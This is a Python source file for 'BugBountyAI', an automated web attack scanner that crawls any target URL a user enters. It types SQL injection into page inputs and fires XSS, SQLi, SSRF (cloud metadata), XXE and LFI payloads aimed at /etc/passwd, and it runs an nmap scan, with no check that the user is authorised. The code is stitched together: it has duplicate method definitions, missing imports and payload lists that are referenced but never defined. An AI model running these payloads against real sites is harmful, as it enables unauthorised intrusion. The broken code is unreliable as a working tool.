import os
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin
import time
import random
from transformers import pipeline
import nmap
import json
from concurrent.futures import ThreadPoolExecutor

class BugBountyAI:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        self.session.verify = False  
        requests.packages.urllib3.disable_warnings()  

        self.chrome_options = Options()
        self.chrome_options.add_argument("--headless")
        self.chrome_options.add_argument("--disable-gpu")
        self.chrome_options.add_argument("--no-sandbox")
        self.chrome_options.add_argument("--disable-dev-shm-usage")
        self.chrome_options.add_argument("--window-size=1920,1080")
        self.chrome_options.add_argument("--remote-debugging-port=9222")
        self.driver = webdriver.Chrome(options=self.chrome_options)
        self.driver.set_page_load_timeout(30)

    def crawl(self, start_url, depth=0):
        """Enhanced crawling with more interaction"""
        if depth > self.config['max_depth'] or start_url in self.visited_urls:
            return
            
        self.visited_urls.add(start_url)
        print(f"[*] Crawling: {start_url}")
        
        try:
            self.driver.get(start_url)
            time.sleep(random.uniform(*self.config['rate_limit_delay']))
            
            self.interact_with_page()
            
            soup = BeautifulSoup(self.driver.page_source, 'html.parser')
            links = [a.get('href') for a in soup.find_all('a', href=True)]
            
            self.find_hidden_endpoints(soup)
            
            self.test_page(start_url, soup)
            
            for link in links:
                absolute_url = urljoin(start_url, link)
                if self.is_in_scope(absolute_url):
                    self.crawl(absolute_url, depth + 1)
                    
        except Exception as e:
            print(f"[!] Error crawling {start_url}: {str(e)}")

    def interact_with_page(self):
        """Interact with page elements to trigger dynamic content"""
        try:
            buttons = self.driver.find_elements(By.TAG_NAME, "button")
            for button in buttons:
                try:
                    button.click()
                    time.sleep(0.5)
                except:
                    continue
                    
            inputs = self.driver.find_elements(By.TAG_NAME, "input")
            for input in inputs:
                try:
                    if input.get_attribute("type") in ["text", "email", "password"]:
                        input.send_keys("test' OR 1=1--")
                        time.sleep(0.3)
                except:
                    continue
        except Exception as e:
            print(f"[!] Interaction error: {str(e)}")

    def find_hidden_endpoints(self, soup):
        """Find hidden endpoints in JavaScript and metadata"""
        scripts = soup.find_all('script')
        for script in scripts:
            if script.string:
                self.extract_urls_from_text(script.string)
                
        links = soup.find_all('link', href=True)
        for link in links:
            if any(x in link['href'] for x in ['api', 'json', 'xml']):
                self.test_api_endpoint(urljoin(self.current_scope, link['href']))
                
        metas = soup.find_all('meta')
        for meta in metas:
            if 'content' in meta.attrs:
                self.extract_urls_from_text(meta['content'])

    def extract_urls_from_text(self, text):
        """Extract URLs from arbitrary text"""
        import re
        urls = re.findall(r'https?://[^\s<>"\']+', str(text))
        for url in urls:
            if self.is_in_scope(url):
                self.test_api_endpoint(url)

    def test_cors(self, url):
        """Test for CORS misconfigurations"""
        try:
            headers = {
                'Origin': 'https://evil.com',
                'Access-Control-Request-Method': 'GET'
            }
            response = self.session.options(url, headers=headers)
            
            if 'access-control-allow-origin' in response.headers:
                if response.headers['access-control-allow-origin'] == '*':
                    self.record_vulnerability(
                        type="CORS Misconfiguration",
                        url=url,
                        payload="Wildcard CORS",
                        confidence=0.9,
                        details="Server allows requests from any origin (*)"
                    )
                elif 'evil.com' in response.headers['access-control-allow-origin']:
                    self.record_vulnerability(
                        type="CORS Misconfiguration",
                        url=url,
                        payload="Reflected Origin",
                        confidence=0.85,
                        details="Server reflects arbitrary Origin header"
                    )
        except Exception as e:
            print(f"[!] CORS test error: {str(e)}")

    def test_jwt(self, url):
        """Test for JWT vulnerabilities"""
        try:
            response = self.session.get(url)
            cookies = response.cookies
            
            for cookie in cookies:
                if len(cookie.value.split('.')) == 3:  
                    self.record_vulnerability(
                        type="JWT Usage Detected",
                        url=url,
                        payload=cookie.name,
                        confidence=0.7,
                        details="JWT token found - manual inspection recommended"
                    )
        except Exception as e:
            print(f"[!] JWT test error: {str(e)}")

    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        self.chrome_options = Options()
        self.chrome_options.add_argument("--headless")
        self.chrome_options.add_argument("--disable-gpu")
        self.chrome_options.add_argument("--no-sandbox")
        self.driver = webdriver.Chrome(options=self.chrome_options)
        
        self.vuln_classifier = pipeline("text-classification", model="distilbert-base-uncased")
        self.payload_generator = pipeline("text-generation", model="gpt2")
        
        self.config = {
            'max_depth': 10,  # Increased from 5 to 10
            'threads': 12,    # Increased from 8 to 12
            'rate_limit_delay': (0.3, 1.5),  # More aggressive scanning
            'test_payloads': {
                'xss': [
                    '<script>alert(1)</script>', 
                    '<img src=x onerror=alert(1)>',
                    '" onmouseover=alert(1) "',
                    '<svg/onload=alert(1)>',
                    'javascript:alert(1)',
                    '"><script>alert(1)</script>',
                    '"><iframe src="javascript:alert(1)">'
                ],
                'sqli': [
                    "' OR '1'='1", 
                    "' OR 1=1--", 
                    '" OR "1"="1', 
                    'admin"--',
                    '1;SELECT * FROM users',
                    '1 AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))'
                ],
                'idor': [
                    '/api/user/1', 
                    '/admin/../user/2', 
                    '/profile/2', 
                    '/account/3',
                    '/api/v1/users/1',
                    '/admin/user/1/profile'
                ],
                'ssrf': [
                    'http://127.0.0.1', 
                    'http://localhost', 
                    'http://169.254.169.254/latest/meta-data/',
                    'http://internal.service',
                    'file:///etc/passwd'
                ],
                'xxe': [
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal.service">]>'
                ],
                'lfi': [
                    '../../../../etc/passwd',
                    '....//....//....//etc/passwd',
                    '%2e%2e%2f%2e%2e%2fetc%2fpasswd'
                ]
            },
            'detailed_reporting': True
        }
        
        self.visited_urls = set()
        self.vulnerabilities = []
        self.current_scope = None
    
    def set_scope(self, target_url):
        """Define the target scope for testing"""
        parsed = urlparse(target_url)
        self.current_scope = f"{parsed.scheme}://{parsed.netloc}"
    
    def crawl(self, start_url, depth=0):
        """Recursive crawling function with depth limiting"""
        if depth > self.config['max_depth'] or start_url in self.visited_urls:
            return
            
        self.visited_urls.add(start_url)
        print(f"[*] Crawling: {start_url}")
        
        try:
            self.driver.get(start_url)
            time.sleep(random.uniform(*self.config['rate_limit_delay']))
            
            soup = BeautifulSoup(self.driver.page_source, 'html.parser')
            links = [a.get('href') for a in soup.find_all('a', href=True)]
            
            self.test_page(start_url, soup)
            
            for link in links:
                absolute_url = urljoin(start_url, link)
                if self.is_in_scope(absolute_url):
                    self.crawl(absolute_url, depth + 1)
                    
        except Exception as e:
            print(f"[!] Error crawling {start_url}: {str(e)}")
    
    def is_in_scope(self, url):
        """Check if URL is within the defined scope"""
        if not self.current_scope:
            return True
        return url.startswith(self.current_scope)
    
    def test_page(self, url, soup):
        """Enhanced page testing with more vulnerability checks"""
        print(f"[*] Testing: {url}")
        forms = soup.find_all('form')
        for form in forms:
            self.test_form(url, form)
        
        self.test_ssti(url, soup)
        self.test_deserialization(url)
        self.test_dom_xss(url, soup)
        self.test_request_smuggling(url)
        self.test_graphql(url)

    def test_ssti(self, url, soup):
        """Test for Server-Side Template Injection"""
        inputs = soup.find_all('input')
        for input in inputs:
            if input.get('type') in ['text', 'search', 'email']:
                for payload in self.config['test_payloads'].get('ssti', []):
                    try:
                        data = {input.get('name', 'input'): payload}
                        response = self.session.post(url, data=data)
                        if '49' in response.text:
                            self.record_vulnerability(
                                type="SSTI",
                                url=url,
                                payload=payload,
                                confidence=0.85,
                                details="Server-Side Template Injection vulnerability detected"
                            )
                    except Exception as e:
                        print(f"[!] SSTI test error: {str(e)}")

    def test_deserialization(self, url):
        """Test for Insecure Deserialization"""
        for payload in self.config['test_payloads'].get('deserialization', []):
            try:
                headers = {'Content-Type': 'application/java-serialized-object'}
                response = self.session.post(url, data=payload, headers=headers)
                if response.status_code == 500 and 'serialization' in response.text.lower():
                    self.record_vulnerability(
                        type="Insecure Deserialization",
                        url=url,
                        payload=payload[:20] + "...",
                        confidence=0.8,
                        details="Potential insecure deserialization vulnerability detected"
                    )
            except Exception as e:
                print(f"[!] Deserialization test error: {str(e)}")

    def test_dom_xss(self, url, soup):
        """Test for DOM-based XSS"""
        scripts = soup.find_all('script')
        for script in scripts:
            if script.string:
                for payload in self.config['test_payloads'].get('dom_xss', []):
                    if payload in script.string:
                        self.record_vulnerability(
                            type="DOM-based XSS",
                            url=url,
                            payload=payload,
                            confidence=0.75,
                            details="Potential DOM-based XSS vulnerability detected"
                        )

    def test_request_smuggling(self, url):
        """Test for HTTP Request Smuggling"""
        parsed = urlparse(url)
        target = f"{parsed.scheme}://{parsed.netloc}"
        
        for payload in self.config['test_payloads'].get('request_smuggling', []):
            try:
                conn = http.client.HTTPConnection(parsed.netloc)
                conn.request("POST", parsed.path, body=payload)
                response = conn.getresponse()
                if 'admin' in response.read().decode().lower():
                    self.record_vulnerability(
                        type="HTTP Request Smuggling",
                        url=url,
                        payload=payload[:50] + "...",
                        confidence=0.9,
                        details="Potential HTTP Request Smuggling vulnerability detected"
                    )
            except Exception as e:
                print(f"[!] Request smuggling test error: {str(e)}")

    def test_graphql(self, url):
        """Test for GraphQL vulnerabilities"""
        graphql_endpoints = ['/graphql', '/api', '/graphql-api', '/query']
        
        for endpoint in graphql_endpoints:
            test_url = urljoin(url, endpoint)
            for payload in self.config['test_payloads'].get('graphql', []):
                try:
                    headers = {'Content-Type': 'application/json'}
                    data = json.dumps({'query': payload})
                    response = self.session.post(test_url, data=data, headers=headers)
                    
                    if response.status_code == 200 and '__schema' in response.text:
                        self.record_vulnerability(
                            type="GraphQL Introspection",
                            url=test_url,
                            payload=payload,
                            confidence=0.85,
                            details="GraphQL introspection enabled - potential information disclosure"
                        )
                except Exception as e:
                    print(f"[!] GraphQL test error: {str(e)}")

    def test_open_redirect(self, url, soup):
        """Test for open redirect vulnerabilities"""
        for param in ['url', 'redirect', 'next', 'return']:
            for payload in self.config['test_payloads'].get('open_redirect', []):
                test_url = f"{url}?{param}={payload}" if '?' not in url else f"{url}&{param}={payload}"
                try:
                    response = self.session.get(test_url, allow_redirects=False)
                    if response.status_code in (301, 302, 307, 308):
                        location = response.headers.get('location', '')
                        if any(x in location for x in ['evil.com', '//evil.com']):
                            self.record_vulnerability(
                                type="Open Redirect",
                                url=test_url,
                                payload=payload,
                                confidence=0.85,
                                details="Open redirect vulnerability detected"
                            )
                except Exception as e:
                    print(f"[!] Open redirect test error: {str(e)}")

    def test_clickjacking(self, url):
        """Test for missing X-Frame-Options header"""
        try:
            response = self.session.get(url)
            if 'x-frame-options' not in response.headers:
                self.record_vulnerability(
                    type="Clickjacking",
                    url=url,
                    payload="Missing X-Frame-Options",
                    confidence=0.7,
                    details="Missing X-Frame-Options header makes site vulnerable to clickjacking"
                )
        except Exception as e:
            print(f"[!] Clickjacking test error: {str(e)}")

    def check_security_headers(self, url):
        """Check for important security headers"""
        try:
            response = self.session.get(url)
            missing_headers = []
            
            if 'content-security-policy' not in response.headers:
                missing_headers.append('Content-Security-Policy')
            if 'x-content-type-options' not in response.headers:
                missing_headers.append('X-Content-Type-Options')
            if 'x-xss-protection' not in response.headers:
                missing_headers.append('X-XSS-Protection')
            if 'strict-transport-security' not in response.headers:
                missing_headers.append('Strict-Transport-Security')
                
            if missing_headers:
                self.record_vulnerability(
                    type="Missing Security Headers",
                    url=url,
                    payload=", ".join(missing_headers),
                    confidence=0.8,
                    details="Missing important security headers: " + ", ".join(missing_headers)
                )
        except Exception as e:
            print(f"[!] Security headers check error: {str(e)}")

    def check_sensitive_data(self, url, soup):
        """Scan for exposed sensitive data patterns"""
        sensitive_patterns = {
            'API Keys': r'(?i)(key|api|token|secret)[\"\']?\s*[:=]\s*[\"\']?[a-z0-9]{20,}[\"\']?',
            'Email Addresses': r'[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}',
            'Credit Cards': r'\b(?:\d[ -]*?){13,16}\b',
            'AWS Keys': r'AKIA[0-9A-Z]{16}',
            'Private IPs': r'(?:10|127|192\.168|172\.(?:1[6-9]|2[0-9]|3[0-1]))\.\d{1,3}\.\d{1,3}'
        }
        
        text = soup.get_text()
        for data_type, pattern in sensitive_patterns.items():
            matches = re.findall(pattern, text)
            if matches:
                self.record_vulnerability(
                    type="Sensitive Data Exposure",
                    url=url,
                    payload=data_type,
                    confidence=0.9,
                    details=f"Potential {data_type} exposure detected: {matches[0]}... (truncated)"
                )

    def check_subdomain_takeover(self):
        """Check for potential subdomain takeover opportunities"""
        try:
            domain = urlparse(self.current_scope).netloc
            subdomains = self.get_subdomains(domain)
            
            for subdomain in subdomains:
                for service in self.config['test_payloads'].get('subdomain_takeover', []):
                    if service in subdomain:
                        try:
                            response = self.session.get(f"http://{subdomain}", timeout=5)
                            if response.status_code == 404 and service in response.text:
                                self.record_vulnerability(
                                    type="Potential Subdomain Takeover",
                                    url=subdomain,
                                    payload=service,
                                    confidence=0.75,
                                    details=f"Potential subdomain takeover possible on {service}"
                                )
                        except:
                            continue
        except Exception as e:
            print(f"[!] Subdomain takeover check error: {str(e)}")

    def get_subdomains(self, domain):
        """Get subdomains using common DNS techniques"""
        # This is a placeholder - in a real implementation you'd use DNS enumeration
        # or services like crt.sh to find subdomains
        common_subdomains = ['dev', 'test', 'staging', 'api', 'admin']
        return [f"{sub}.{domain}" for sub in common_subdomains]

    def test_xxe(self, url, soup):
        """Test for XML External Entity vulnerabilities"""
        if not any(tag.name == 'input' and tag.get('type') == 'file' for tag in soup.find_all()):
            return
            
        for payload in self.config['test_payloads'].get('xxe', []):
            try:
                files = {'file': ('test.xml', payload)}
                response = self.session.post(url, files=files)
                if 'root:x:' in response.text or 'internal.service' in response.text:
                    self.record_vulnerability(
                        type="XXE Injection",
                        url=url,
                        payload=payload,
                        confidence=0.8,
                        details="XML External Entity injection vulnerability detected"
                    )
            except Exception as e:
                print(f"[!] XXE test error: {str(e)}")

    def test_lfi(self, url):
        """Test for Local File Inclusion vulnerabilities"""
        for payload in self.config['test_payloads'].get('lfi', []):
            test_url = f"{url}?file={payload}" if '?' not in url else f"{url}&file={payload}"
            try:
                response = self.session.get(test_url)
                if 'root:x:' in response.text:
                    self.record_vulnerability(
                        type="LFI",
                        url=test_url,
                        payload=payload,
                        confidence=0.85,
                        details="Local File Inclusion vulnerability detected"
                    )
            except Exception as e:
                print(f"[!] LFI test error: {str(e)}")

    def record_vulnerability(self, type, url, payload, confidence, details=None):
        """Enhanced vulnerability recording with detailed information"""
        for v in self.vulnerabilities:
            if v['url'] == url and v['type'] == type and v['payload'] == payload:
                return
                
        vulnerability = {
            'type': type,
            'url': url,
            'payload': payload,
            'confidence': confidence,
            'timestamp': time.time(),
            'details': details or self.get_vulnerability_details(type),
            'severity': self.assess_severity(type)
        }
        self.vulnerabilities.append(vulnerability)

    def get_vulnerability_details(self, vuln_type):
        """Provide detailed information about each vulnerability type"""
        details = {
            'XSS': "Cross-Site Scripting allows attackers to execute malicious scripts in the victim's browser",
            'SQL Injection': "Allows attackers to interfere with database queries and potentially access sensitive data",
            'IDOR': "Insecure Direct Object References allow unauthorized access to resources by modifying parameters",
            'SSRF': "Server-Side Request Forgery can force the server to make requests to internal resources",
            'XXE': "XML External Entity processing can lead to file disclosure and server-side request forgery",
            'LFI': "Local File Inclusion can expose sensitive files on the server",
            'Missing Authentication': "Missing authentication checks allow unauthorized access to sensitive functionality"
        }
        return details.get(vuln_type, "No additional details available")

    def assess_severity(self, vuln_type):
        """Assign severity levels to vulnerabilities"""
        severity_map = {
            'XSS': 'High',
            'SQL Injection': 'Critical',
            'IDOR': 'Medium',
            'SSRF': 'High',
            'XXE': 'High',
            'LFI': 'High',
            'Missing Authentication': 'Critical',
            'Potential RCE': 'Critical',
            'Prototype Pollution': 'High',
            'JWT Weakness': 'High',
            'SSTI': 'High',
            'Insecure Deserialization': 'Critical',
            'DOM-based XSS': 'Medium',
            'HTTP Request Smuggling': 'High',
            'GraphQL Introspection': 'Medium'
        }
        return severity_map.get(vuln_type, 'Medium')
    
    def test_form(self, url, form):
        """Test web forms for vulnerabilities"""
        form_details = {
            'action': form.get('action'),
            'method': form.get('method', 'get').lower(),
            'inputs': [input.get('name') for input in form.find_all('input')]
        }
        
        print(f"[*] Testing form at {url} with {len(form_details['inputs'])} inputs")
        
        # Test XSS
        for payload in self.config['test_payloads']['xss']:
            if self.submit_form_with_payload(form_details, payload):
                self.record_vulnerability(
                    type="XSS",
                    url=url,
                    payload=payload,
                    confidence=0.8
                )
        
        # Test SQLi
        for payload in self.config['test_payloads']['sqli']:
            if self.submit_form_with_payload(form_details, payload):
                response = self.submit_form_with_payload(form_details, payload)
                if "error" in response.text.lower() or "sql" in response.text.lower():
                    self.record_vulnerability(
                        type="SQL Injection",
                        url=url,
                        payload=payload,
                        confidence=0.7
                    )
    
    def submit_form_with_payload(self, form_details, payload):
        """Submit a form with test payload"""
        target_url = urljoin(self.current_scope, form_details['action'])
        data = {input_name: payload for input_name in form_details['inputs']}
        
        try:
            if form_details['method'] == 'post':
                return self.session.post(target_url, data=data)
            else:
                return self.session.get(target_url, params=data)
        except Exception as e:
            print(f"[!] Form submission error: {str(e)}")
            return None
    
    def test_idor(self, url):
        """Test for Insecure Direct Object References"""
        for pattern in self.config['test_payloads']['idor']:
            test_url = urljoin(url, pattern)
            try:
                response = self.session.get(test_url)
                if response.status_code == 200:
                    self.record_vulnerability(
                        type="Potential IDOR",
                        url=test_url,
                        payload=pattern,
                        confidence=0.6
                    )
            except:
                continue
    
    def test_ssrf(self, url, soup):
        """Test for Server-Side Request Forgery vulnerabilities"""
        for payload in self.config['test_payloads'].get('ssrf', []):
            try:
                response = self.session.get(url, params={'url': payload})
                if 'metadata' in response.text or 'root:x' in response.text:
                    self.record_vulnerability(
                        type="SSRF",
                        url=url,
                        payload=payload,
                        confidence=0.7
                    )
            except Exception as e:
                print(f"[!] SSRF test error: {str(e)}")
    
    def find_api_endpoints(self, soup):
        """Find and test API endpoints"""
        scripts = soup.find_all('script')
        for script in scripts:
            if script.get('src'):
                if 'api' in script.get('src').lower():
                    self.test_api_endpoint(urljoin(self.current_scope, script.get('src')))
    
    def test_api_endpoint(self, endpoint):
        """Test identified API endpoints"""
        print(f"[*] Testing API endpoint: {endpoint}")
        try:
            # Test for common API vulnerabilities
            response = self.session.get(endpoint)
            
            # Check for sensitive data exposure
            if response.status_code == 200:
                data = response.json() if 'application/json' in response.headers.get('content-type', '') else {}
                if self.ai_analyze_response(data):
                    self.record_vulnerability(
                        type="Potential Data Exposure",
                        url=endpoint,
                        payload="",
                        confidence=0.75
                    )
                    
            # Test for missing authentication
            auth_test_url = endpoint + "/admin" if not endpoint.endswith("/") else endpoint + "admin"
            auth_response = self.session.get(auth_test_url)
            if auth_response.status_code == 200:
                self.record_vulnerability(
                    type="Missing Authentication",
                    url=auth_test_url,
                    payload="",
                    confidence=0.85
                )
                
        except Exception as e:
            print(f"[!] API test error: {str(e)}")
    
    def ai_analyze_response(self, data):
        """Use AI to analyze responses for sensitive data"""
        text_data = str(data)
        result = self.vuln_classifier(text_data)
        return result[0]['label'] == 'SENSITIVE' and result[0]['score'] > 0.7
    
    def test_logic_flaws(self, url, soup):
        """Test for basic logic flaws (heuristic)"""
        # Example: Check for missing CSRF tokens in forms
        forms = soup.find_all('form')
        for form in forms:
            inputs = [i.get('name','') for i in form.find_all('input')]
            if not any('csrf' in inp.lower() for inp in inputs):
                self.record_vulnerability(
                    type="Potential Logic Flaw",
                    url=url,
                    payload="Missing CSRF token",
                    confidence=0.5
                )
    
    def record_vulnerability(self, type, url, payload, confidence):
        for v in self.vulnerabilities:
            if v['url'] == url and v['type'] == type and v['payload'] == payload:
                return
        self.vulnerabilities.append({
            'type': type,
            'url': url,
            'payload': payload,
            'confidence': confidence,
            'timestamp': time.time()
        })
        similar = [v for v in self.vulnerabilities if v['url'] == url]
        if len(similar) > 2:
            for v in similar:
                v['confidence'] = max(v['confidence'], 0.8)
    
    def generate_report(self):
        """Generate a vulnerability report"""
        report = {
            'target': self.current_scope,
            'date': time.strftime("%Y-%m-%d"),
            'vulnerabilities': self.vulnerabilities
        }
        filename = f"report_{self.current_scope.replace('://', '_').replace('/', '_')}.json"
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
        print(f"[+] Report saved to {filename}")
    
    def scan_network(self, target_ip):
        """Perform basic network scanning (use with caution)"""
        print(f"[*] Scanning network: {target_ip}")
        scanner = nmap.PortScanner()
        scanner.scan(target_ip, arguments='-sV -T4')
        for host in scanner.all_hosts():
            print(f"\nHost: {host}")
            for proto in scanner[host].all_protocols():
                print(f"Protocol: {proto}")
                ports = scanner[host][proto].keys()
                for port in sorted(ports):
                    print(f"Port: {port}\tState: {scanner[host][proto][port]['state']}")
    
    def run(self, target_url):
        """Main execution method"""
        self.set_scope(target_url)
        self.crawl(target_url)
        
        with ThreadPoolExecutor(max_workers=self.config['threads']) as executor:
            executor.submit(self.scan_network, urlparse(target_url).netloc)
        
        self.generate_report()
        self.driver.quit()

if __name__ == "__main__":
    scanner = BugBountyAI()
    target = input("Enter target URL to scan (e.g., https://example.com): ")
    scanner.run(target)